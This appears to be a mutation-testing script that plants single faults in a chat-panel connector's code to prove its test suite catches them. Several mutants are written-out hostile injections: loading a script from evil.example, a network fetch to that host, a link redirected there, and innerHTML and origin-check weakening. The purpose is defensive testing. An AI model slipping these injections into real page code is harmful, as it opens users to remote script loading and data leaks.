// Must-fail proof for tests/connect-perfect-city-card.test.mjs (the Perfect City panel in the chat, CONNECT 11-27): each mutant breaks ONE thing in a scratch copy of the connector code and the suite must then FAIL.
// A baseline run on the unbroken copy must PASS first, and every mutant's text must occur EXACTLY once (a text that moved is "broken", not "caught"). Run ALONE:  node tests/connect_perfect_city_card_mutants.mjs
import fs from 'node:fs';
import path from 'node:path';
import { spawnSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';
// a planted fault that makes a suite HANG must end the run loudly, never stall it (node:test has no time limit of its own); a timeout is neither "caught" nor "missed"
const noHang = (r) => { if (r.error || /test timed out after/.test(String(r.stdout) + String(r.stderr))) throw new Error('HUNG: the suite did not end in 5 minutes (' + (r.error ? r.error.code : 'a test timed out') + '): write the fault so a test fails, not hangs'); return r; };

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const scratch = path.join(root, '.mut-pccard');
const C = 'supabase/functions/connect-core/';
const M = C + 'mcp.ts', A = C + 'mcp_app.ts', K = C + 'perfect_city_card.ts';
const SUITES = ['connect-perfect-city-card.test.mjs'];
const mutants = [
  // the switch: OFF must be the connector as it was
  ['resources/list answers when the switch is OFF', M, 'case "resources/list": {\n      if (!deps.mcpApp?.enabled) return', 'case "resources/list": {\n      if (false) return'],
  ['resources/read answers when the switch is OFF', M, 'case "resources/read": {\n      if (!deps.mcpApp?.enabled) return', 'case "resources/read": {\n      if (false) return'],
  ['the tool list carries the page link when the switch is OFF', M, 'toolList(!!deps.mcpApp?.enabled, chatEditorOn(deps.mcpApp), homePanelOn(deps.mcpApp), preparedDataOn(deps.mcpApp))', 'toolList(true, chatEditorOn(deps.mcpApp), homePanelOn(deps.mcpApp), preparedDataOn(deps.mcpApp))'],
  ['the REST face list carries the page link', M, 'export const toolList = (mcpApp = false, chatEditor = false, homePanel = false, preparedData = false)', 'export const toolList = (mcpApp = true, chatEditor = false, homePanel = false, preparedData = false)'],
  ['every tool is given a page', M, 'mcpApp && UI_TOOL_URIS[t.name] ?', 'mcpApp ?'],
  ['the tool is not given its page', A, 'perfect_city_summary: PERFECT_CITY_URI, ', ''],
  ['another tool is given the Perfect City page', A, 'list_projects: CARD_URI }', 'list_projects: CARD_URI, open_perfect_city: PERFECT_CITY_URI }'],
  ['the tool is given the compilation page', A, 'perfect_city_summary: PERFECT_CITY_URI, ', 'perfect_city_summary: COMPILATION_URI, '],
  ['the page is not listed', A, '{ uri: PERFECT_CITY_URI, name: "Ryagram Perfect City numbers"', '{ uri: PERFECT_CITY_URI + "-x", name: "Ryagram Perfect City numbers"'],
  ['the page is served with a network origin allowed', A, 'csp: { connectDomains: [], resourceDomains: [] }', 'csp: { connectDomains: ["https://api.example.com"], resourceDomains: [] }'],
  ['the page is served with a border it did not ask for', A, 'prefersBorder: false', 'prefersBorder: true'],
  ['the page is served with the card\'s text', A, 'text: perfectCityHtml(cfg.appUrl) }', 'text: cardHtml(cfg.appUrl) }'],
  ['the page is served without its address check', K, 'const link = appUrl && APP_URL.test(appUrl) ? appUrl : "";', 'const link = appUrl ?? "";'],
  ['any address of any shape is taken for the page', K, 'perfect-city-[0-9a-f]{12}$/;', 'perfect-city-[0-9a-f]{12}/;'],
  ['the build id stops following the page', K, 'export const PERFECT_CITY_BUILD = buildId();', 'export const PERFECT_CITY_BUILD = "000000000000";'],
  ['a tool answer is changed when the panel is on', M, 'if (r.data) result.structuredContent = r.data;', 'if (r.data) result.structuredContent = deps.mcpApp?.enabled ? { ...r.data, panel: true } : r.data;'],
  // the page's limits
  ['a second script is added from outside', K, '"<script>" + SCRIPT', '"<script src=\\"https://evil.example/x.js\\"></script><script>" + SCRIPT'],
  ['the page makes a network request', K, '"var last=0;",', '"var last=0;fetch(\'https://evil.example/\');",'],
  ['the page grows past its budget', K, '"ul{margin:0;padding:0 0 0 18px}", ', '"ul{margin:0;padding:0 0 0 18px}" + "/*" + "x".repeat(30000) + "*/", '],
  ['text is set as markup', K, 'if(text!=null)e.textContent=text;return e;', 'if(text!=null)e.innerHTML=text;return e;'],
  ['an inline event handler is written', K, '<main class=\\"cc\\" id=\\"pc\\" aria-live', '<main class=\\"cc\\" id=\\"pc\\" onclick=\\"x()\\" aria-live'],
  ['a modern arrow function is used', K, '"function post(m){m.jsonrpc=\'2.0\';host.postMessage(m,\'*\');}",', '"var post=(m)=>{m.jsonrpc=\'2.0\';host.postMessage(m,\'*\');};",'],
  ['a non-ASCII look-alike character is written into the page', K, '"var BASIS={observed:1,calculated:1,estimated:1};",', '"var BASIS={observed:1,calculated:1,estimated:1};\\u00e9",'],
  // the look and the phone width
  ['a button is under 44px', K, 'button{min-height:44px;', 'button{min-height:40px;'],
  ['the long value column cannot shrink', K, 'grid-template-columns:96px minmax(0,1fr);gap:12px', 'grid-template-columns:96px 1fr;gap:12px'],
  ['the ring table columns cannot shrink', K, 'grid-template-columns:52px minmax(0,1fr) minmax(0,1.3fr);gap:10px', 'grid-template-columns:52px 1fr 1fr;gap:10px'],
  ['the phone-width ring table columns cannot shrink', K, '.tr{grid-template-columns:44px minmax(0,1fr) minmax(0,1.3fr);gap:6px', '.tr{grid-template-columns:44px 1fr 1fr;gap:6px'],
  ['the old card look comes back', K, 'border-radius:18px', 'border-radius:12px'],
  ['the heading loses its serif wordmark', K, 'h1{margin:0;font:400 24px/1 Georgia,Times New Roman,serif', 'h1{margin:0;font:400 24px/1 system-ui'],
  ['the button loses its dark ink', K, 'color:#14141a;font:inherit', 'color:#ffffff;font:inherit'],
  // what the page believes and draws
  ['messages from any window are believed', K, 'if(ev.source!==host)return;', 'if(false)return;'],
  ['the protocol version is not checked', K, "m.jsonrpc!=='2.0')return;", "false)return;"],
  ['control and direction characters are kept', K, "replace(BAD,' ').slice", 'slice'],
  ['a name is not cut', K, 'nm=clean(n.name,80)', 'nm=clean(n.name,90000)'],
  ['a sentence is not cut', K, 'o.push(clean(v[i],600))', 'o.push(clean(v[i],900000))'],
  ['the method sentence is not cut', K, 'clean(pa.method,600)', 'clean(pa.method,900000)'],
  ['a name is drawn without its quotes', K, "Q1+n.name+Q2+': '", "n.name+': '"],
  ['the line that says names are plain text is dropped', K, 'if(v.hasNames)st.appendChild(', 'if(false)st.appendChild('],
  ['a name that is not text is drawn', K, "if(typeof n.name!=='string')return null;", ''],
  ['a place or kind that is not the tool\'s is drawn', K, "||!has(PLACES,sc.place)", ''],
  ['a kind that is not the tool\'s is drawn', K, "||typeof sc.business_type!=='string'||!has(KINDS,sc.business_type)", ''],
  ['the place is drawn as its id', K, 'place:PLACES[sc.place],biz:KINDS[sc.business_type]', 'place:sc.place,biz:KINDS[sc.business_type]'],
  ['the kind is drawn as its id', K, 'biz:KINDS[sc.business_type]', 'biz:sc.business_type'],
  ['the spot is drawn the wrong way round', K, "v.lat+', '+v.lon", "v.lon+', '+v.lat"],
  ['a spot outside the earth is drawn', K, 'num(sc.spot.lat,-90,90)', 'num(sc.spot.lat,-9000,9000)'],
  ['a result that scored or ranked is drawn', K, "||sc.score_given!==false||sc.ranking_given!==false", ''],
  ['a ranking flag is not checked', K, "||sc.ranking_given!==false)return null;", ')return null;'],
  ['a result that is not the tool\'s is drawn', K, "if(sc.ok!==true||sc.looked_up!==true", "if(false"],
  ['a basis word that is not one of the three is drawn', K, "typeof v==='string'&&has(BASIS,v)?v:null", "typeof v==='string'?v:null"],
  ['a basis word that is an inherited name is drawn', K, 'function has(o,k){return Object.prototype.hasOwnProperty.call(o,k);}', 'function has(o,k){return o[k]!==undefined;}'],
  ['the distance basis word is always "calculated"', K, "n.km+' km ('+n.basis+')'", "n.km+' km (calculated)'"],
  ['the people basis word is always "estimated"', K, "' people ('+g.pbasis+')'", "' people (estimated)'"],
  ['the places basis word is always "calculated"', K, "g.places.value+' ('+g.places.basis+')'", "g.places.value+' (calculated)'"],
  ['the count of places loaded is drawn without its word', K, "'Places of this kind loaded: '+v.loaded+' (calculated)'", "'Places of this kind loaded: '+v.loaded"],
  ['a count that is not whole is rounded and drawn', K, 'Math.floor(n)===n?n:null', 'Math.floor(n)===n?n:Math.round(n)'],
  ['a count that is text is drawn', K, "typeof v==='number'&&isFinite(v)&&v>=min&&v<=max?v:null", "v!=null&&v>=min&&v<=max?v:null"],
  ['a count that is huge is drawn', K, 'whole(sc.places_loaded,10000000)', 'whole(sc.places_loaded,1e30)'],
  ['a rank that does not match its place is drawn', K, '||n.rank!==i+1)return null;', ')return null;'],
  ['a nearest list out of order is drawn', K, 'km===null||km<prev||', 'km===null||'],
  ['more than five nearest places are drawn', K, 'sc.nearest.length>5||', ''],
  ['a different number of rings is drawn', K, '||sc.rings.length!==RINGS.length)return null;', ')return null;'],
  ['a ring at another distance is drawn', K, 'r.km!==RINGS[j]||', ''],
  ['no places loaded with a nearest place is drawn', K, '||(loaded===0&&sc.nearest.length>0)', ''],
  ['no places loaded with a count of places is drawn', K, 'if(loaded===0){if(r.places!==null)return null;}', 'if(loaded===0){}'],
  ['a people figure without its method is drawn', K, 'if(pv!==null&&m===null)return null;', ''],
  ['a not-known list that is empty is drawn', K, 'if(!Array.isArray(v)||v.length<1||v.length>12)return null;', 'if(!Array.isArray(v)||v.length>12)return null;'],
  ['an answer without its not-known list or credits is drawn', K, 'if(v.notKnown===null||v.credits===null)return null;', ''],
  ['a sentence that is not text is drawn', K, "if(typeof v[i]!=='string'||!v[i])return null;", ''],
  ['the loaded count says nothing when none are loaded', K, "if(v.loaded===0){st.appendChild(el('p','hint',W.noload));}", "if(v.loaded===0){}"],
  ['no nearest places is not said when places are loaded', K, "if(!v.nearest.length)st.appendChild(el('p','hint',W.nonear));", ''],
  ['the method sentence is said once per ring', K, 'seen.indexOf(g.method)<0', 'true'],
  ['the method sentence is never said', K, 'for(var q=0;q<seen.length;q++)', 'for(var q=0;q<0;q++)'],
  ['what is not known is not drawn', K, "kids.push(list(v.notKnown));", ''],
  ['the credits are not drawn', K, "kids.push(list(v.credits));", ''],
  ['the no-score line is dropped', K, "kids.push(el('p','hint',W.noscore));", ''],
  ['the table header is dropped', K, "tb.appendChild(cells('th','Ring','Similar places','People about'));", ''],
  ['a ring with no people figure is drawn as a number', K, "g.people===null?'not given for this ring ('+g.pbasis+')'", "g.people===null?'about 0 people ('+g.pbasis+')'"],
  ['the table loses its role', K, "tb.setAttribute('role','table');", ''],
  // refused answers
  ['a switch that is off is said as something else', K, " if(sc.looked_up===false&&sc.switch===SW&&sc.on===false&&sc.owner_only===true)return {kind:'refused',text:W.off};", ''],
  ['any answer that is not on is said as owner-only', K, '&&sc.on===false&&sc.owner_only===true)', ')'],
  ['a switch of another department is said as ours', K, 'if(sc.available===false&&sc.switch===SW)', 'if(sc.available===false)'],
  ['an unreadable switch is not said', K, " if(sc.available===false&&sc.switch===SW)return {kind:'refused',text:W.gate};", ''],
  ['the daily cap is not said', K, " if(sc.retry_after_seconds===86400)return {kind:'refused',text:W.daily};", ''],
  ['the hourly limit is said as the daily cap', K, "if(sc.retry_after_seconds===3600)return {kind:'refused',text:W.hourly};", "if(sc.retry_after_seconds===3600)return {kind:'refused',text:W.daily};"],
  ['a refusal is not drawn', K, ' if(sc.ok===false)return refusal(sc);', ''],
  ['a refusal is given a button', K, " else if(v.kind==='refused'){kids.push(el('p','hint',v.text));}", " else if(v.kind==='refused'){kids.push(el('p','hint',v.text));if(appUrl){var a2=el('div','acts');a2.appendChild(btn('Open on the site',openPage));kids.push(a2);}}"],
  ['a refusal with nothing looked up claims more', K, " if(sc.looked_up!==false)return null;", " if(false)return null;"],
  ['the daily sentence promises more', K, 'has answered all it gives this account for today.', 'has answered everything for today.'],
  ['the sentence for no places loaded is changed', K, 'are not loaded yet, so there is no distance', 'are not here yet, so there is no distance'],
  ['the owner-only sentence is changed', K, 'off: PC_OFF_WORDS,', 'off: "Perfect City is off.",'],
  ['the hourly sentence names a price', K, 'Try again later. Nothing was looked up.', 'Try again later; more checks cost credits. Nothing was looked up.'],
  // the one button
  ['the button opens another address', K, "ask('ui/open-link',{url:url}", "ask('ui/open-link',{url:'https://evil.example/'}"],
  ['the button opens a different page of the site', K, 'export const PERFECT_CITY_CARD_PAGE = PERFECT_CITY_PAGE;', 'export const PERFECT_CITY_CARD_PAGE = "#/d/games";'],
  ['the data can change the address', K, '"function paint(sc){",', '"function paint(sc){if(sc&&typeof sc.url===\'string\')appUrl=sc.url;",'],
  ['a second button is added', K, "a.appendChild(btn('Open on the site',openPage));kids.push(a);}", "a.appendChild(btn('Open on the site',openPage));a.appendChild(btn('Open',openPage));kids.push(a);}"],
  ['the page talks into the conversation', K, '"var last=0;",', '"var last=0;ask(\'ui/message\',{role:\'user\',content:{type:\'text\',text:\'hello\'}},function(){});",'],
  ['the page sends a name to the host', K, "note('ui/notifications/size-changed',{width:", "note('ui/notifications/size-changed',{who:root.textContent,width:"],
  ['the host is never told the height', K, 'if(h&&h!==last){last=h;note(', 'if(false){last=h;note('],
  ['the host is never told the page is ready', K, "function(){note('ui/notifications/initialized',{});size();}", 'function(){size();}'],
  ['the teardown request is not answered', K, 'post({id:m.id,result:{}});return;', 'return;'],
  ['an unknown request from the host is not refused', K, "post({id:m.id,error:{code:-32601,message:'Method not found'}});return;", 'return;'],
  ['a host that will not open the link is not told to the person', K, 'if(refused(r))openFailed(url);', ''],
];

function run(cwd) {
  return noHang(spawnSync(process.execPath, ['--test', '--test-timeout=120000', ...SUITES.map((s) => path.join('tests', s))], { encoding: 'utf8', cwd, timeout: 300000, killSignal: 'SIGKILL' }));
}
function fresh() {
  fs.rmSync(scratch, { recursive: true, force: true });
  fs.mkdirSync(path.join(scratch, 'supabase'), { recursive: true });
  fs.cpSync(path.join(root, 'supabase/functions'), path.join(scratch, 'supabase/functions'), { recursive: true });
  fs.cpSync(path.join(root, 'tests'), path.join(scratch, 'tests'), { recursive: true });
  fs.cpSync(path.join(root, 'assets'), path.join(scratch, 'assets'), { recursive: true });
  if (fs.existsSync(path.join(root, 'package.json'))) fs.copyFileSync(path.join(root, 'package.json'), path.join(scratch, 'package.json'));
}
fresh();
if (run(scratch).status) { console.log('BASELINE FAILS (nothing proved)'); fs.rmSync(scratch, { recursive: true, force: true }); process.exit(2); }
console.log('baseline passes');
let missed = 0;
const only = process.env.ONLY ? process.env.ONLY.split('|') : null;   // optional: rerun just the mutants whose name contains one of these words
for (const [name, file, from, to] of mutants) {
  if (only && !only.some((w) => name.includes(w))) continue;
  fresh();
  const target = path.join(scratch, file);
  const src = fs.readFileSync(target, 'utf8').replace(/\r\n/g, '\n');
  const n = src.split(from).length - 1;
  if (n !== 1) { console.log(`BROKEN MUTANT (text found ${n} times, need 1): ${name}`); missed++; continue; }
  fs.writeFileSync(target, src.replace(from, () => to));
  const caught = run(scratch).status !== 0;
  console.log(`${caught ? 'caught ' : 'MISSED '} ${name}`);
  if (!caught) missed++;
}
fs.rmSync(scratch, { recursive: true, force: true });
const ran = only ? mutants.filter(([n]) => only.some((w) => n.includes(w))).length : mutants.length;
console.log(missed ? `${missed} mutant(s) not caught` : `all ${ran} mutants caught` + (only ? ' (of the ' + mutants.length + '; a filtered run)' : ''));
process.exit(missed ? 1 : 0);
